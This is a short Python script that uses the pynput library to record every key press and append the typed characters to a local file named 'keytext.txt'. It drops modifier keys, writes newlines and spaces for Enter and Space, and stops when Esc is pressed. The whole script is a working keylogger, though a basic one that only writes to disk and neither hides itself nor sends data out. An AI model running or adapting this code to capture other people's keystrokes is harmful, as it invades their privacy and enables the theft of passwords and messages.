from pynput.keyboard import Key, Listener


def on_press(key):
    # k.append(key)
    write_1(key)


def write_1(var):
    with open("keytext.txt", "a") as f:

        new_var = str(var).replace("'", "")
        # not write any specific key
        attribute = (
        "Key.space", "Key.enter", "Key.shift", "Key.ctrl_l", "Key.backspace", "Key.alt_l", "Key.cmd", "Key.caps_lock",
        "Key.tab", "Key.shift_r","Key.esc")

        if new_var not in attribute:
            f.write(str(new_var))

        if new_var == "Key.enter":
            f.write("\n")
        if new_var=="Key.space":
            f.write(" ")


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press, on_release=on_release) as l:
    l.join()
